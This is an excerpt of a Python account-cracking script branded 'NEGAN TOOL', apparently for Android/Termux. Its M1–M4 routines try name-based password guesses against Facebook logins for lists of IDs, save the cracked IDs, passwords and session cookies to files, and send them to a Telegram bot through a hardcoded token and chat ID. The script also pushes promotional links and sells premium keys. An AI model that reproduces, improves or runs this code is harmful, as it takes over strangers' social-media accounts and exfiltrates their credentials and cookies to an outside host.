...
os.system('xdg-open https://t.me/T_0T_T_0')
try:
...
print('\033[1;37m[\033[1;31m~\033[1;37m] \033[1;32mWELLCOM TO NEGAN TOOL ...')
os.system("espeak -a 300 \"WELLCOM, TO, NEGAN, TOOL,\"")
print('\033[1;37m[\033[1;31m~\033[1;37m] \033[1;32mTO UPDATE VERSION 1.5 ..') 
os.system("espeak -a 300 \"TO,  UPDATE,  VERSION,  1.5 \"")
...
def Elite(id,ps,coki):
    try:
        import requests
        token = "6782171524:AAGJmzPF4YaXgf3uFv-aVORJoSTFoUtgsL4"#Add yout token 
        chatid = "1728474499"#Add your Chat Id
...
os.system(f'xdg-open https://t.me/TWDxn')
sys.stdout.write('\x1b]2; <[NEGAN-TWD]>\x07')
logo=(f"""
\033[1;34m
    ███╗   ██╗███████╗ ██████╗  █████╗ ███╗   ██╗
    ████╗  ██║██╔════╝██╔════╝ ██╔══██╗████╗  ██║
...
\033[1;37m[\033[1;31m~\033[1;37m] \033[1;38mFACEBOK \033[1;37m: \033[1;37m[\033[1;31m M. O. LAMLOM \033[1;37m] \033[1;38m 
\033[1;37m[\033[1;31m~\033[1;37m] \033[1;38mGITHUB  \033[1;37m: \033[1;37m[\033[1;31m NeganxHack \033[1;37m] \033[1;32m
\033[1;37m[\033[1;31m~\033[1;37m] \033[1;38mSERVICE \033[1;37m: \033[1;37m[\033[1;34m FREE \033[1;37m] \033[1;38m
\033[1;37m[\033[1;31m~\033[1;37m] \033[1;38mVERSION \033[1;37m: \033[1;37m[\033[1;34m 1.5 \033[1;37m] \033[1;38m
\033[1;34m______________________________________________________________""")
def linex():
    print('\033[1;34m______________________________________________________________')
def clear():
        os.system('clear')
        print(logo)
loop=0
...
def menu():
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://chat.whatsapp.com/F4j54WawFdDLoRZwiE5')
                                menu()
                        elif xd in ['5','05']:
                                os.system('xdg-open https://t.me/ZZKGZ')
                                menu()
                        elif xd in ['6','06']:
                                os.system('xdg-open https://www.facebook.com/mafiamggcs16')
                                menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use ♥ ')
                        else:
...
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m<[NEGAN]>×<[%s| \033[1;32mOK\033[1;37m|\033[1;34mCP \033[1;32m%s\033[1;37m|\033[1;34m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m<[NEGAN-OK]> '+ids+' | '+pas+'\033[1;97m')
                                                         
                                        #------[OK IDS]------#
                                        #print("\033[1;33m <[BISCUT-🍪]> :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/NEGAN_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NEGAN_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        oks.append(ids)
                                        Elite(ids,pas,ckkk)
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m<[NEGAN-CP]> '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/NEGAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/NEGAN-CP.txt','a').write(ids+'|'+pas+'\n')
...
def M2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m<[NEGAN-M2]>×<[%s| \033[1;32mOK\033[1;37m|\033[1;34mCP \033[1;32m%s\033[1;37m|\033[1;34m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m<[NEGAN-OK]> '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')
#os.system("espeak -a 300 \"NEGAN,  OK,  YOUCEF,  THANKS,  \"") 
                                        print("\033[1;34m <[BISCUT-🍪]> :\033[1;37m "+cookie)           
                                        open('/sdcard/NEGAN_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NEGAN_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)
                                        Elite(ids,pas,ckkk)
                                        break
...
def M3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m<[NEGAN-M3]>×<[%s| \033[1;32mOK\033[1;37m|\033[1;34mCP \033[1;32m%s\033[1;37m|\033[1;34m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m <[NEGAN-OK]> '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')                 
                                        #print("\033[1;33m [BISCUT-🍪] :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/NEGAN_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NEGAN_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                      
                                        oks.append(ids)
                                        Elite(ids,pas,ckkk)                           
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
...
def M4(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m<[NEGAN-M4]>×<[%s| \033[1;32mOK\033[1;37m|\033[1;34mCP \033[1;32m%s\033[1;37m|\033[1;34m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m<[NEGAN-OK]> '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')                 
                                       # print("\033[1;33m<[BISCUT-🍪]> :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/NEGAN_m4_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NEGAN_iDs_COOKiE_M4.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        oks.append(ids)
                                        Elite(ids,pas,ckkk)
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
...
def main_apv():
    ...
    try:
        ...
        if Xyteee in system:
            ...
            print('\033[1;32m[\033[1;31m-\033[1;32m] \033[1;37m Notes : NEGAN Tools Can buy in all countries!')
            print('\033[1;34m═════════════════════════════════════════\033[1;97m')
            ...
            tks = ("Hi NEGAN Sir, I Need To Buy Your NEGAN Tools Version 4.22 Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+Xyteee+"\n Buy Select : "+Picchi)
